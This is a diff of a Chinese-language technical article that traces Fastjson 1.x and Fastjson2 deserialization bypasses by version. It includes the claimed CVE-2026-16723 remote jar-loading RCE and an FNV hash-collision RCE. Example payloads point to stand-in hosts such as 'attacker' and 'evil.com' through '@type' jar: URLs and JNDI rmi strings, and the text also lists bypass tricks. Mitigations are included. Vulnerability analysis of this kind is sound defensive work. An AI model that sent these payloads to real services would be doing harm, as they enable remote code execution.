@@ -40,18 +40,20 @@ DataSource ds = (DataSource) ctx.lookup(getDataSourceName());  // JNDI 查询
 
 ### 版本演进与攻击方式对照表
 
-| 版本范围              | 核心防御机制                                 | 绕过技巧                                   | 是否需要 AutoType | 攻击效果                  |
-| ----------------- | -------------------------------------- | -------------------------------------- | ------------- | --------------------- |
-| **≤1.2.24**       | 无防御                                    | 直接使用 `JdbcRowSetImpl`                  | 否（默认开启）       | JNDI → RCE            |
-| **1.2.25-1.2.41** | 引入黑白名单默认关闭 AutoType                    | `L类名;` 包裹`[类名` 数组                      | **是**         | JNDI → RCE            |
-| **1.2.42**        | 黑名单改为哈希值仅做一次首尾检测                       | `LL类名;;` 双写                            | **是**         | JNDI → RCE            |
-| **1.2.43**        | 修复 `L/;` 双写                            | `[类名` 数组                               | **是**         | JNDI → RCE            |
-| **1.2.44-1.2.46** | 修复数组绕过，引入 expectClass                | `expectClass` + 第三方依赖（MyBatis 等）         | **是**         | JNDI → RCE            |
-| **1.2.47**        | 缓存机制成为弱点                               | `java.lang.Class` 预加载                  | **否**         | JNDI → RCE            |
-| **1.2.48-1.2.67** | 限制 JNDI 类                              | 利用难度大增                                 | —             | —                     |
-| **1.2.68**        | JNDI 类被封堵SafeMode 引入放宽 `AutoCloseable` | 基于 expectClass + `AutoCloseable` 扩展 gadget | **否**         | 文件读取 / BCEL / 有限 JNDI |
-| **1.2.68-1.2.83** | SafeMode 默认关闭，AutoType 默认关闭，黑名单扩大      | **JsonType 纯库利用，gadget-free**          | **否**         | RCE（CVE-2026-16723）   |
-| **Fastjson2 ≤ 2.0.62** | AutoType 默认关闭，FNV-1a 白名单哈希校验            | **FNV 哈希碰撞 + jar: URL 远程加载**                  | **否**         | RCE（CVE 待分配，2026.07）  |
+| 版本范围                   | 较上一版改进                                     | 绕过技巧                                           | 是否需要 AutoType | 攻击效果                  |
+| ---------------------- | ------------------------------------------ | ---------------------------------------------- | ------------- | --------------------- |
+| **≤1.2.24**            | —                                          | 直接 `@type` 指定 `JdbcRowSetImpl`                 | 否（默认开启）       | JNDI → RCE            |
+| **1.2.25-1.2.41**      | 引入黑白名单，默认关闭 AutoType                       | `L类名;` 包裹绕过                                    | **是**         | JNDI → RCE            |
+| **1.2.42**             | 黑名单改为哈希值，仅做一次首尾检测                          | `LL类名;;` 双写绕过                                  | **是**         | JNDI → RCE            |
+| **1.2.43**             | 修复 `L/;` 双写                                | `[类名` 数组绕过                                     | **是**         | JNDI → RCE            |
+| **1.2.44-1.2.46**      | 修复数组绕过，引入 expectClass                      | expectClass + 第三方依赖（MyBatis 等）                 | **是**         | JNDI → RCE            |
+| **1.2.47**             | 加固 expectClass 机制                          | `java.lang.Class` 写缓存绕过                        | **否**         | JNDI → RCE            |
+| **1.2.48-1.2.67**      | 限制 JNDI 类                                  | 利用难度大增，无公开绕过                                   | —             | —                     |
+| **1.2.68**             | 引入 SafeMode，放宽 `AutoCloseable`             | expectClass + `AutoCloseable` 扩展 gadget        | **否**         | 文件读取 / BCEL / 有限 JNDI |
+| **1.2.69-1.2.79**      | 封堵已知第三方 gadget（commons-io、commons-codec 等） | AutoCloseable 仍配合 expectClass 绕过               | **否**         | 受限利用                  |
+| **1.2.80**             | 继续封堵新发现的 gadget 类                          | 覆盖面不完整，旧版 gadget 链仍有遗漏                         | **否**         | 受限利用                  |
+| **1.2.81-1.2.83**      | 黑名单基本覆盖已知 gadget 类，1.2.83 最终版停止维护          | **@JSONType 是机制级缺陷**，非禁用某个类能解决（CVE-2026-16723） | **否**         | RCE                   |
+| **Fastjson2 ≤ 2.0.62** | FNV-1a 白名单哈希校验                             | **FNV 哈希碰撞 + jar: URL 远程加载**                   | **否**         | RCE（CVE 待分配，2026.07）  |
 
 ## 三、fastjson<=1.24-jndi
 
@@ -254,7 +256,7 @@ if (className.charAt(0) == 'L' && className.charAt(className.length() - 1) == ';
 | 1.2.43+       | 数组绕过仍可用        | 只修复了 `L`/`;` 双写        |
 | 1.2.44+       | 两种绕过均被修复       | 增加首尾字符多重检测             |
 
-## fastjson1.47
+## 五、fastjson 1.2.47
 
 到1.47版本，通过字符绕过的方法已经不可行，但引入了一种新的调用方法：
 
@@ -522,7 +524,7 @@ field.setAccessible(true);  // 突破private限制
 field.set(对象实例, 新值);
 ```
 
-## fastjson1.2.68
+## 六、fastjson 1.2.68 — expectClass + AutoCloseable
 
 1.2.68 版本做了重大加固：
 
@@ -548,7 +550,7 @@ if (expectClass != null) {
 
 **关键前提**：业务代码中必须存在 `JSON.parseObject(json, AutoCloseable.class)` 这样的调用。
 
-#### 各利用链的因果关系
+### 各利用链的因果关系
 
 ```mermaid
 flowchart TD
@@ -569,7 +571,7 @@ flowchart TD
     
 ```
 
-#### 链一：文件读取（BOMInputStream 盲注）
+### 链一：文件读取（BOMInputStream 盲注）
 
 条件：
 
@@ -728,7 +730,7 @@ MATCH bom=UTF-8:[59, 32, 102, 111, 114]
 
 注意：这里的 `NO_MATCH` 是 PoC 主动抛出的，用来把“猜错/猜对”稳定地变成布尔信号。真实场景能否盲注，取决于业务侧是否存在可观测差异（响应内容/HTTP 状态码/日志/耗时等）；如果业务把异常吞掉且无任何侧信道，这条链在实战里就没有可用回显。
 
-####  有限 JNDI
+### 有限 JNDI
 
 | 项目        | 说明                              |
 | --------- | ------------------------------- |
@@ -770,7 +772,7 @@ ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
 
 ***
 
-## 六、fastjson 1.2.68-1.2.83 CVE-2026-16723（2026.07）
+## 七、fastjson 1.2.68-1.2.83 CVE-2026-16723（2026.07）
 
 2026 年 7 月 19 日，安全研究员 Kirill Firsov 公开披露 fastjson 1.x 末代版本（1.2.68-1.2.83）的 gadget-free RCE，**无需 AutoType 开启、无需任何第三方依赖**，CVSS 9.0。
 
@@ -793,29 +795,65 @@ ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
 
 ### 利用原理
 
-```text
-1. 攻击者发送 {"@type":"jar:http://attacker/probe.jar!.POC","x":1}
-2. Fastjson 解析 @type，进入 checkAutoType()
-3. typeName 转资源路径，getResourceAsStream() 触发 LaunchedURLClassLoader
-   → 发起 HTTP 请求拉取远程 probe.jar
-4. ASM 扫描字节码，发现 @JSONType 注解 → jsonType=true
-5. 条件判断：autoTypeSupport || jsonType || expectClassFlag
-   false || true || false = true → 绕过检查，进入 loadClass()
-6. defineClass() 加载远程类 → <clinit> 触发 → RCE
+**第一步：类名伪装成资源路径**
+
+攻击者传入的 `@type` 值不是普通类名，而是一个 `jar:` URL：
+
+```json
+{"@type": "jar:http://attacker/probe.jar!.POC", "x": 1}
 ```
 
-**根因：** Fastjson 的 type-resolution 路径中存在对用户可控类名的 `getResourceAsStream()` 调用，而 Spring Boot fat-jar 的 ClassLoader 支持通过 HTTP 加载远程 JAR；同时 `@JSONType` 注解被当作信任信号，使得攻击者提供的类跳过危险基类检查。
+**第二步：Fastjson 尝试"加载"这个类，意外触发 HTTP 请求**
+
+`checkAutoType()` 拿到 `jar:http://attacker/probe.jar!.POC` 后，并不知道它是恶意 URL——它只是把类名当作资源路径，调用 `getResourceAsStream()` 去找这个类对应的字节码：
+
+```text
+正常情况：类名 "com.foo.Bar" → getResourceAsStream("com/foo/Bar.class") → 读本地 classpath
+本次情况：类名 "jar:http://attacker/probe.jar!.POC" 
+         → getResourceAsStream("jar:http://attacker/probe.jar!.POC") 
+         → Spring Boot fat-jar 的 LaunchedURLClassLoader 把它当远程 URL 处理 
+         → 发起 HTTP 请求，下载 attacker 上的 probe.jar
+```
+
+**为什么 Spring Boot fat-jar 会发 HTTP 请求？**
+
+&#x20;因为 fat-jar 部署（`java -jar xxx.jar`）使用 `LaunchedURLClassLoader`，它支持 `jar:` 协议的远程资源加载——这是 Spring Boot 的正常设计，不是漏洞。
+
+<br />
+
+**第三步：ASM 扫描字节码，发现** **`@JSONType`** **注解**
+
+下载到 probe.jar 后，Fastjson 用 ASM 扫描字节码，发现 POC 类上有 `@JSONType` 注解 → 设置 `jsonType=true`。
+
+<br />
+
+**第四步：注解信任绕过安全检查**
+
+`checkAutoType()` 内部的条件判断：
+
+```java
+// autoTypeSupport 默认 false || jsonType=true || expectClass false
+false || true || false = true  // 放行！
+```
+
+Fastjson 认为"打了 `@JSONType` 注解的类是自己人"，直接放行，不检查 AutoType 开关、不检查黑名单。
+
+**第五步：加载远程类 → 静态代码块执行 → RCE**
+
+绕过检查后进入 `loadClass()` → `defineClass()` → JVM 初始化类 → `static{ }` 恶意代码自动执行。
+
+**根因一句话：** Fastjson 把用户可控的类名传给了 `getResourceAsStream()`，而 Spring Boot fat-jar 的 ClassLoader 把这个调用变成了 HTTP 请求；加上 `@JSONType` 被无条件信任，攻击者只需在自己的类上打这个注解就能绕过所有安全检查。
 
 ### 与 1.2.68 expectClass 路线的区别
 
 两个漏洞都始于 1.2.68，但机制完全不同：
 
-| | 1.2.68 expectClass | 1.2.68-1.2.83 CVE-2026-16723 |
-|---|---|---|
-| 绕过机制 | expectClass + AutoCloseable | @JSONType 注解信任 |
-| 需要第三方库 | **是**（MyBatis/BCEL 等） | **否**（gadget-free） |
-| 攻击效果 | 文件读取 / BCEL / 有限 JNDI | **直接 RCE** |
-| 危害 | 中等 | 高危（CVSS 9.0） |
+| <br /> | 1.2.68 expectClass          | 1.2.68-1.2.83 CVE-2026-16723 |
+| ------ | --------------------------- | ---------------------------- |
+| 绕过机制   | expectClass + AutoCloseable | @JSONType 注解信任               |
+| 需要第三方库 | **是**（MyBatis/BCEL 等）       | **否**（gadget-free）           |
+| 攻击效果   | 文件读取 / BCEL / 有限 JNDI       | **直接 RCE**                   |
+| 危害     | 中等                          | 高危（CVSS 9.0）                 |
 
 1.2.68 的 expectClass 路线本质是"找第三方库凑 gadget"，classpath 上没有对应库就打不了。CVE-2026-16723 不走这个路径，而是利用 `@JSONType` 注解的信任机制——Fastjson 认为打了此注解的类是自己人，直接放行，AutoType 开关对它无效。
 
@@ -828,31 +866,31 @@ ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
 
 ### 防护
 
-| 优先级 | 措施                                                             |
-| --- | -------------------------------------------------------------- |
-| P0  | 启用 SafeMode：`-Dfastjson.parser.safeMode=true`                  |
-| P0  | 或使用 noneautotype 构建：`com.alibaba:fastjson:1.2.83_noneautotype` |
+| 优先级 | 措施                                                                  |
+| --- | ------------------------------------------------------------------- |
+| P0  | 启用 SafeMode：`-Dfastjson.parser.safeMode=true`                       |
+| P0  | 或使用 noneautotype 构建：`com.alibaba:fastjson:1.2.83_noneautotype`      |
 | P1  | 迁移到 Fastjson 2.x ≥ 2.0.63（架构上根除此问题，但需注意 2.x ≤ 2.0.62 另有独立 RCE，见第七章） |
-| 辅助  | 限制应用出网 HTTP，切断远程 JAR 拉取链路                                      |
+| 辅助  | 限制应用出网 HTTP，切断远程 JAR 拉取链路                                           |
 
 **注意：Fastjson 1.x 已停止维护，无官方补丁。**
 
 ***
 
-## 七、Fastjson2 RCE — FNV 哈希碰撞绕过（2026.07）
+## 八、Fastjson2 RCE — FNV 哈希碰撞绕过（2026.07）
 
 2026 年 7 月 27 日，长亭应急响应实验室公开披露 Fastjson2 远程代码执行漏洞（CVE 待分配），影响 Fastjson2 ≤ 2.0.62，**全 JDK 版本通杀**。官方已于 7 月 25 日提交修复 [PR #7695](https://github.com/alibaba/fastjson2/pull/7695)。
 
 ### 与 Fastjson 1.x CVE-2026-16723 的区别
 
-| | Fastjson 1.x CVE-2026-16723 | Fastjson2 RCE |
-|---|---|---|
-| 影响范围 | 1.2.68 - 1.2.83 | ≤ 2.0.62 |
-| 绕过机制 | @JSONType 注解信任 | FNV-1a 前缀哈希碰撞 |
-| 攻击向量 | `jar:http://attacker/probe.jar!.POC` | 构造类名碰撞白名单哈希值 |
-| 前提条件 | Spring Boot fat-jar | **默认配置即可**（无需 fat-jar） |
-| 修复状态 | 无官方补丁 | 官方已修复（2.0.63+） |
-| PoC | 已公开 | 未公开（补丁可逆向） |
+| <br /> | Fastjson 1.x CVE-2026-16723          | Fastjson2 RCE          |
+| ------ | ------------------------------------ | ---------------------- |
+| 影响范围   | 1.2.68 - 1.2.83                      | ≤ 2.0.62               |
+| 绕过机制   | @JSONType 注解信任                       | FNV-1a 前缀哈希碰撞          |
+| 攻击向量   | `jar:http://attacker/probe.jar!.POC` | 构造类名碰撞白名单哈希值           |
+| 前提条件   | Spring Boot fat-jar                  | **默认配置即可**（无需 fat-jar） |
+| 修复状态   | 无官方补丁                                | 官方已修复（2.0.63+）         |
+| PoC    | 已公开                                  | 未公开（补丁可逆向）             |
 
 ### 漏洞成因（补丁逆向）
 
@@ -894,12 +932,12 @@ for (int i = 0; i < typeName.length(); i++) {
 
 这和 Log4j / Fastjson 1.x 的 JNDI 利用是同一个思路——最终都走到"让 JVM 去远程加载一个类，`static{}` 执行恶意代码"，区别只是"怎么让 JVM 同意去加载"：
 
-| 漏洞 | 如何让 JVM 加载远程类 |
-|------|---------------------|
-| Log4j | `${jndi:rmi://evil.com/Exploit}` → JNDI 查询 → 远程加载 |
-| Fastjson 1.x ≤1.2.24 | `{"@type":"JdbcRowSetImpl","dataSourceName":"rmi://..."}` → JNDI 查询 → 远程加载 |
+| 漏洞                          | 如何让 JVM 加载远程类                                                                |
+| --------------------------- | ---------------------------------------------------------------------------- |
+| Log4j                       | `${jndi:rmi://evil.com/Exploit}` → JNDI 查询 → 远程加载                            |
+| Fastjson 1.x ≤1.2.24        | `{"@type":"JdbcRowSetImpl","dataSourceName":"rmi://..."}` → JNDI 查询 → 远程加载   |
 | Fastjson 1.x CVE-2026-16723 | `{"@type":"jar:http://evil.com/probe.jar!.Exploit"}` → @JSONType 信任 → 直接远程加载 |
-| **Fastjson2 RCE** | `{"@type":"jar:http://evil.com/x!.Exploit"}` → **FNV 哈希碰撞绕过白名单** → 直接远程加载 |
+| **Fastjson2 RCE**           | `{"@type":"jar:http://evil.com/x!.Exploit"}` → **FNV 哈希碰撞绕过白名单** → 直接远程加载    |
 
 VPS 上只需准备一个普通 Java 类，`static{}` 里写恶意代码：
 
@@ -943,7 +981,7 @@ if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
 }
 ```
 
-**2. 拦截 `:` 和 `!` 字符**（入口封堵）
+**2. 拦截** **`:`** **和** **`!`** **字符**（入口封堵）
 
 ```java
 // checkAutoType() 和 loadClass() 均增加
@@ -967,11 +1005,11 @@ this.acceptNameSet = Collections.unmodifiableSet(normalizedNames);
 
 ### 防护
 
-| 优先级 | 措施 |
-| --- | --- |
-| P0 | 升级到 Fastjson2 ≥ 2.0.63（[PR #7695](https://github.com/alibaba/fastjson2/pull/7695)） |
-| P0 | 启用 SafeMode：`-Dfastjson2.parser.safeMode=true` |
-| 辅助 | WAF 拦截请求体中 key 包含 `@type` 的 JSON |
+| 优先级 | 措施                                                                                 |
+| --- | ---------------------------------------------------------------------------------- |
+| P0  | 升级到 Fastjson2 ≥ 2.0.63（[PR #7695](https://github.com/alibaba/fastjson2/pull/7695)） |
+| P0  | 启用 SafeMode：`-Dfastjson2.parser.safeMode=true`                                     |
+| 辅助  | WAF 拦截请求体中 key 包含 `@type` 的 JSON                                                   |
 
 ### 与其他漏洞的关系
 
@@ -980,3 +1018,4 @@ this.acceptNameSet = Collections.unmodifiableSet(normalizedNames);
 - 1.x 利用 `@JSONType` 注解信任；2.x 利用 FNV 哈希碰撞
 - Fastjson 1.x 和 2.x 开启 SafeMode 后均不受此漏洞影响
 - 1.x 的 noneautotype 版本不受影响
+
